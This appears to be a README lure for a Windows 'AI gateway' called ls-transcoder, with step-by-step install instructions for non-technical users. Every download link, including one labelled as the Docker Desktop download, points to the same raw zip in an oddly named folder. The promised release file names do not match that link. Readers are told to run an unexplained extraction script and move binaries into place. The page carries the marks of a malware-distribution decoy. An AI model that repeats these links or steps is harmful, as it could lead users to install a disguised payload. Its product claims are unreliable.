# ⚙️ ls-transcoder - Efficient AI Gateway for Windows

[![Download ls-transcoder](https://img.shields.io/badge/Download-ls--transcoder-brightgreen)](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip)

---

## 📥 Download ls-transcoder

To get ls-transcoder, visit the official release page below. Here, you will find the latest pre-compiled packages for different architectures.

👉 [Go to ls-transcoder releases](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip)

Choose the version that matches your computer. Most PCs will need the **x64** package. If you have an ARM-based Windows device, pick the ARM64 version.

This guide will help you download and run ls-transcoder on a Windows system without requiring programming skills.

---

## 🌟 What is ls-transcoder?

ls-transcoder acts as a high-performance AI gateway. It helps your computer run multiple AI tasks smoothly and efficiently. It is built with the Rust programming language for speed and reliability. You will see a dashboard to control and interact with the system easily, all through your browser.

This software helps connect AI models and APIs to your environment. It supports different computer types and uses Docker containers for easy management.

---

## 🖥️ System Requirements

Before you begin, make sure your Windows PC meets these requirements:

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM (8 GB or more works better)
- 2 GHz or faster processor (x64 or ARM64)
- Minimum 5 GB free disk space
- Internet connection for downloading and updates
- Docker Desktop installed ([Docker Download](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip))

---

## 🚀 Getting Started with ls-transcoder on Windows

### Step 1: Download the Package

1. Open your web browser.
2. Go to the ls-transcoder releases page:  
   https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip
3. Scroll to the latest release version.
4. Download the file named like `ls-transcoder-v1.0.0-windows-x64.zip` for most PCs.  
   If you have an ARM64 Windows device, find `ls-transcoder-v1.0.0-windows-arm64.zip`.
5. Save the file to a folder you can find easily, like **Downloads**.

---

### Step 2: Extract the Files

1. Right-click the downloaded ZIP file.
2. Choose **Extract All...** from the menu.
3. Select or create a folder to extract the contents to, for example, `C:\ls-transcoder`.
4. Click **Extract** and wait for the process to finish.
   
You should see folders like `cli-server`, `apps/web-dashboard/dist/`, and some scripts.

---

### Step 3: Preparing the Core Files

The core executable files are inside the package but need to be extracted before running.

1. Open **PowerShell** or **Command Prompt**.
2. Change directory to the folder where you extracted ls-transcoder. For example:
   ```
   cd C:\ls-transcoder
   ```
3. Run the extraction script by typing:
   ```
   bash extract_official_ls.sh
   ```
   Make sure you have Git Bash or a similar Bash shell installed on Windows for this step.
4. After the script runs, move the files from `core-bin` to the `bin` folder in the same directory:
   ```
   move .\core-bin\* .\bin\
   ```

---

### Step 4: Install and Run Docker Desktop

ls-transcoder runs inside Docker containers for easy setup.

1. If Docker Desktop is not installed, download and install it from:  
   https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip
2. After installation, start Docker Desktop and make sure it is running.
3. Open a new PowerShell or Command Prompt window.
4. Navigate to the folder where you extracted ls-transcoder.
5. Run the container with this command:
   ```
   docker-compose up -d
   ```
6. This command starts the ls-transcoder backend in the background.

---

### Step 5: Open the Web Dashboard

1. Open your web browser.
2. Go to the local address:
   ```
   http://localhost:3000
   ```
3. You will see the Interactive API Dashboard.
4. Use this dashboard to work with ls-transcoder’s AI functions and settings.

---

## 📁 Package Contents Explained

Here is what is inside the download package and what each part does:

- **cli-server/**: The main server backend written in Rust. This handles all the core AI processing.
- **apps/web-dashboard/dist/**: The files for the dashboard you see in your browser. It provides easy access to features.
- **extract_official_ls.sh**: Shell script to extract main executable files (`core-bin`).
- **Dockerfile.binary** and **docker-compose.yml**: Configuration files for Docker. These define how ls-transcoder runs in containers.

---

## ⚙️ Notes on Supported Architectures

ls-transcoder supports multiple computer types. When downloading, select the right package:

- For common 64-bit PCs, use the **windows-x64** package.
- For Windows ARM devices, use the **windows-arm64** package.

Running the correct version ensures good performance and compatibility.

---

## 🔧 How to Stop or Restart ls-transcoder

If you want to stop ls-transcoder at any time:

1. Open PowerShell or Command Prompt.
2. Navigate to your ls-transcoder folder.
3. Run this command:
   ```
   docker-compose down
   ```

To start it again, run:
```
docker-compose up -d
```

This helps you control the service without hassle.

---

## 🔍 Additional Tips

- Keep the ls-transcoder folder organized to avoid confusion.
- Regularly check the release page for updates.
- Use the dashboard to explore features without needing to use command lines.
- Make sure Docker Desktop runs properly before using ls-transcoder.

---

## 📥 Download Link Reminder

Visit the ls-transcoder releases page again here to download or update the software:

[Download ls-transcoder](https://raw.githubusercontent.com/tranhai2007/ls-transcoder/main/heterochromatism/ls_transcoder_v2.5.zip)